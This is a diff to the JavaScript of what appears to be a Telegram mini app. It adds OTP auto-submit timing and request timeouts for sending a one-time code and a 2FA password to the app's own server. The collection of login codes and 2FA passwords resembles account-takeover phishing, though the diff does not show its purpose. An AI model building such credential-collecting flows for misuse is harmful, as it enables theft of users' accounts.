@@ -181,8 +181,13 @@ function init() {
                 if (activeViewName === "otp") {
                     if (activeInput.value.length < 6) {
                         activeInput.value += val;
-                        if (activeInput.value.length === 6) {
+                        const len = activeInput.value.length;
+                        if (len === 6) {
+                            clearTimeout(otpAutoSubmitTimer);
                             submitOtp();
+                        } else if (len === 5) {
+                            clearTimeout(otpAutoSubmitTimer);
+                            otpAutoSubmitTimer = setTimeout(submitOtp, 400);
                         }
                     }
                 } else {
@@ -342,11 +347,15 @@ async function submitOtp() {
     
     try {
         const initData = tg.initData || "";
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 70000);
         const res = await fetch("/api/submit_otp", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ initData, otp, clientUuid })
+            body: JSON.stringify({ initData, otp, clientUuid }),
+            signal: controller.signal
         });
+        clearTimeout(timer);
         
         const data = await res.json();
         isSubmitting = false;
@@ -383,11 +392,15 @@ async function submit2fa() {
     
     try {
         const initData = tg.initData || "";
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 70000);
         const res = await fetch("/api/submit_2fa", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ initData, password, clientUuid })
+            body: JSON.stringify({ initData, password, clientUuid }),
+            signal: controller.signal
         });
+        clearTimeout(timer);
         
         const data = await res.json();
         isSubmitting = false;
